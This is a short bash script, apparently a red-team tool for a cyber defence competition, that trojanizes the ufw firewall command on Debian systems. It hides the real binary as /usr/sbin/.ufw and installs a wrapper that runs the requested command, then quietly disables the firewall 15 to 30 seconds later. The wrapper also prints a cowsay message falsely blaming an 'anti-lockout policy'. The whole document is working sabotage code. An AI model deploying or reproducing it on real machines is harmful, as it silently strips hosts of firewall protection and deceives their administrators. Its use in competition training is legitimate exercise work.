#! /bin/bash

# Name: UFW Cowsay
# Notes:
# - Moves ufw command to /usr/sbin/.ufw
# - Replaces ufw command at /usr/sbin/ufw with a bash script
# - New script executes the real ufw, but then runs ufw disable shortly after
# - Includes cowsay message to inform users when ufw is disabled
# - Usage: ./blue_ufw_cowsay.sh
# Valid Targets: Blue team debian based images

echo "Setting up UFW Cowsay..."

sudo apt update
sudo apt install cowsay -y

SCRIPT="#!/bin/bash

/usr/sbin/.ufw \$@

sleep $((15 + $RANDOM % 15)) && \
if ! /usr/sbin/.ufw status | grep -qw \"active\"; then exit 0; fi && \
/usr/sbin/.ufw disable > /dev/null && \
echo \"\" && \
cowsay \"Firewall disabled due to anti-lockout policy!\" \
&& echo \"\" &
"

sudo mv /usr/sbin/ufw /usr/sbin/.ufw
echo "$SCRIPT" | sudo tee /usr/sbin/ufw > /dev/null

sudo chmod +x /usr/sbin/ufw

echo "Done configuring UFW Cowsay."
